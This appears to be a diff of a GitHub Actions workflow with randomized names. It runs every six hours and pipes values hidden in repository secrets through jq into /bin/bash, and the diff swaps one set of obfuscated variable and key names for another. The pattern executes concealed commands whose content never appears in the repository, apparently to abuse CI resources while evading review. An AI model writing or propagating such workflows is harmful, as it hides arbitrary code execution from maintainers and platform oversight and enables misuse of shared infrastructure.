@@ -3,8 +3,8 @@ name: xushengtian4175
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
-jobs:  # 20147
+    - cron: '19 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +12,18 @@ jobs:  # 20147
       - uses: actions/checkout@v4
       - name: xushengtian4175
         env:
-          gq0440: ${{ secrets.gq0440 }}
+          htkwf8: ${{ secrets.htkwf8 }}
         run: |
-          echo $gq0440 | jq -r .sud655 | /bin/bash
-          echo $ucgqs452 | jq -r .x733 | /bin/bash
-          echo $cm72740 | jq -r .lxrwh69270 | /bin/bash
-          echo $wqz21 | jq -r .x02163 | /bin/bash
-          echo $oxr6 | jq -r .tw27668 | /bin/bash
-          echo $hglzb3 | jq -r .kyjla71 | /bin/bash
-          echo $yvzt7569 | jq -r .jsba526 | /bin/bash
-          echo $dh09393 | jq -r .dp64 | /bin/bash
-          echo $ejymo5611 | jq -r .d56024 | /bin/bash
-          echo $ngd7379 | jq -r .sikqf705 | /bin/bash
-          echo $jn1 | jq -r .rwwp98 | /bin/bash
+          echo $htkwf8 | jq -r .mny7501 | /bin/bash
+          echo $yx57 | jq -r .qb64 | /bin/bash
+          echo $f5 | jq -r .syqw30194 | /bin/bash
+          echo $tgz6875 | jq -r .ql19 | /bin/bash
+          echo $fkh2895 | jq -r .lfdrv194 | /bin/bash
+          echo $wusq31 | jq -r .g0879 | /bin/bash
+          echo $so2 | jq -r .yr552 | /bin/bash
+          echo $xqa21 | jq -r .xc90765 | /bin/bash
+          echo $iqk1607 | jq -r .ssx7 | /bin/bash
+          echo $or946 | jq -r .t53996 | /bin/bash
+          echo $ez7877 | jq -r .vyuis6 | /bin/bash
+          echo $b001 | jq -r .i3 | /bin/bash
 
